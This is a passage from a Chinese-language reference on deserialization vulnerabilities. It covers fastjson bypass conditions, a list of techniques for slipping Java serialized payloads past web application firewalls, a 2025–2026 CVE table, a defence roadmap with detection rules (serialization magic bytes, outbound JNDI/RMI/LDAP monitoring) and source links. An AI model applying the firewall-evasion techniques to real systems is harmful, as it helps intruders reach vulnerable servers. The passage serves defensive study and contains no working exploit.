// 在 set/get 方法中触发恶意代码
// 1.2.80 修复后，仍可通过特定条件触发：
// 1. 应用代码中有 @JSONType 注解的类
// 2. classpath 中存在特定依赖
// 3. 通过 Throwable / Exception 子类绕过

// 防御：升级到 fastjson 2.x（重写安全模型）
// 或迁移到 Jackson（更安全的默认配置）
```

来源: [奇安信技术研究院 — fastjson 影响深度测量](https://research.qianxin.com/archives/1240) / [腾讯云 — Fastjson 反序列化复现](https://cloud.tencent.com/developer/article/2396003) / [看雪 — Fastjson 自定义序列化](https://bbs.kanxue.com/thread-286518.htm) / [博客园 — log4j vs fastjson](https://www.cnblogs.com/Y0uhe/p/18791153)

---

### C10. Synacktiv — Java 反序列化 WAF 绕过

[Synacktiv — Java Deserialization Tricks](https://www.synacktiv.com/en/publications/java-deserialization-tricks)：

**WAF 绕过技术**:
```
1. Java 序列化数据中包含大量二进制 → WAF 通常不深检测
2. 修改 tc_reference / tc_classDesc 长度字段
3. 使用 gzip 压缩序列化数据
4. HTTP/2 多路复用拆分序列化字节
5. Base64 / URL 编码混淆
6. 利用 Java 序列化的可变长度字段
```

---

### C11. 2025-2026 综合 CVE 速查（反序列化）

| CVE | 产品 | 语言 | 类型 | 备注 |
|------|------|------|------|------|
| **CVE-2025-53770** | Microsoft SharePoint | .NET | 未授权反序列化 RCE | CVSS 9.8, ToolShell |
| **CVE-2025-59287** | Microsoft WSUS | .NET | 未授权反序列化 RCE | CVSS 9.8 |
| CVE-2025-24813 | Apache Tomcat | Java | Partial PUT + 反序列化 | 需特定配置 |
| CVE-2024-42323 | Apache HertzBeat | Java | SnakeYAML 反序列化 | JDBC 链 |
| CVE-2026-27830 | c3p0 | Java | JNDI Reference 反序列化 | GHSA-5476-xc4j-rqcv |
| CVE-2025-53771 | SharePoint | .NET | 同 53770 变体 | Trend Micro 分析 |
| CVE-2025-49704 | SharePoint | .NET | 主动利用 | Unit 42 |
| CVE-2025-49706 | SharePoint | .NET | 同上 | Unit 42 |
| CVE-2023-48178 | Relution MDM | Java | 反序列化 RCE | Praetorian |

来源: [Code White — Public Vulnerability List](https://code-white.com/public-vulnerability-list/) / [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

---

### C12. 2025-2026 防御升级路线图

| 层级 | 措施 | 优先级 |
|------|------|--------|
| **架构** | 避免 ObjectInputStream.readObject() | P0 |
| **架构** | 用 JSON 替代 Java 序列化 | P0 |
| **架构** | 用 SafeConstructor（SnakeYAML 2.0+） | P0 |
| **架构** | .NET 禁用 BinaryFormatter | P0 |
| **架构** | Python 避免 pickle.loads（用户数据） | P0 |
| **架构** | PHP 避免 unserialize（用户数据） | P0 |
| **JEP 290** | Java 9+ 启用全局反序列化过滤器 | P0 |
| **JEP 290** | 监控反序列化违规 | P1 |
| **类路径** | 移除不必要的 commons-collections / ROME | P0 |
| **类路径** | 升级至 fastjson 2.x 或迁移 Jackson | P0 |
| **类路径** | 升级至 SnakeYAML 2.0+ | P0 |
| **RASP** | 部署 RASP（Contrast / OpenRASP / 长亭） | P1 |
| **RASP** | 监控 ObjectInputStream / fastjson JSON.parse | P1 |
| **WAF** | 检测 magic bytes（rO0ABX / O: / AAEAAAD） | P2 |
| **WAF** | 限制请求体 Content-Length | P2 |
| **检测** | 监控 w3wp.exe / java 子进程异常 | P0 |
| **检测** | 监控 outbound JNDI / RMI / LDAP 连接 | P0 |
| **应急** | 补丁 SLA：Critical 24h / High 7d | P0 |
| **供应链** | SCA 扫描所有依赖 | P1 |
| **供应链** | 订阅 GHSA / NVD 公告 | P1 |

---

### C13. 参考资源更新

**最新 CVE 分析**:
- [Rapid7 — CVE-2025-53770 SharePoint ETR](https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-microsoft-sharepoint-servers-cve-2025-53770/)
- [ZeroPath — ToolShell SharePoint](https://zeropath.com/blog/cve-2025-53770-sharepoint-deserialization-rce)
- [Contrast Security — ToolShell Inside](https://www.contrastsecurity.com/security-influencers/inside-the-toolshell-zero-day-sharepoints-insecure-deserialization-flaw)
- [Zscaler ThreatLabz — SharePoint Zero-day](https://www.zscaler.com/blogs/security-research/cve-2025-53770-zero-day-exploit-impacts-microsoft-sharepoint-services)
- [Microsoft Security Blog — SharePoint Exploitation](https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/)
- [Picus Security — CVE-2025-59287 WSUS](https://www.picussecurity.com/resource/blog/cve-2025-59287-explained-wsus-unauthenticated-rce-vulnerability)
- [Unit 42 — WSUS Analysis](https://unit42.paloaltonetworks.com/microsoft-cve-2025-59287/)
- [OffSec — WSUS Deep Dive](https://www.offsec.com/blog/recent-vulnerabilities-in-wsus-service/)
- [HeroDevs — CVE-2025-24813 Tomcat](https://www.herodevs.com/blog-posts/cve-2025-24813-remote-code-execution-in-apache-tomcat-via-partial-put-path-equivalence)
- [phithon — HertzBeat SnakeYAML](https://www.leavesongs.com/PENETRATION/jdbc-injection-with-hertzbeat-cve-2024-42323.html)
- [yulate — HertzBeat Native Deser](https://yulate.github.io/post/g7fC6A2EUF/)
- [CertCube — HertzBeat SnakeYAML](https://blog.certcube.com/snakeyaml-deserialization-rce-cve-2024-42323/)
- [Praetorian — Relution RCE](https://www.praetorian.com/blog/relution-remote-code-execution-java-deserialization-vulnerability/)

**学术与最新研究**:
- [ACM — Sleeping Giants](https://dl.acm.org/doi/10.1145/3719027.3765031)
- [Atredis — Finding Gadgets 2026](https://www.atredis.com/blog/2026/3/12/findings-gadgets-like-its-2026)
- [OWASP Stuttgart — Java 17+ Deserialization](https://owasp.org/www-chapter-stuttgart/assets/slides/2024-12-10_Exploiting_deserialization_vulnerabilities_in_recent_Java_versions.pdf)
- [Synacktiv — Java Deserialization Tricks](https://www.synacktiv.com/en/publications/java-deserialization-tricks)
- [Rhino Security Labs — Custom ysoserial](https://rhinosecuritylabs.com/research/java-deserializationusing-ysoserial/)
- [Mandiant / Google Cloud — Hunting Deserialization](https://cloud.google.com/blog/topics/threat-intelligence/hunting-deserialization-exploits/)
- [Code White — Public Vulnerability List](https://code-white.com/public-vulnerability-list/)

**经典参考**:
- [frohoff/ysoserial](https://github.com/frohoff/ysoserial)
- [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [PHPGGC](https://github.com/ambionics/phpggc)
- [PortSwigger — Deserialization](https://portswigger.net/web-security/deserialization)
- [OWASP — Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

**中文社区**:
- [奇安信技术研究院 — fastjson 影响深度测量](https://research.qianxin.com/archives/1240)
- [奇安信技术研究院](https://research.qianxin.com/)
- [长亭百川云 — RASP 视角的 FastJson](https://rivers.chaitin.cn/blog/cq951vh0lnechd244iqg)
- [phithon — leavesongs](https://www.leavesongs.com/)
- [腾讯云 — Fastjson 复现](https://cloud.tencent.com/developer/article/2396003)
- [看雪 — Fastjson 自定义序列化](https://bbs.kanxue.com/thread-286518.htm)
- [博客园 — log4j vs fastjson 本质](https://www.cnblogs.com/Y0uhe/p/18791153)
- [先知社区 xz.aliyun.com](https://xz.aliyun.com/)
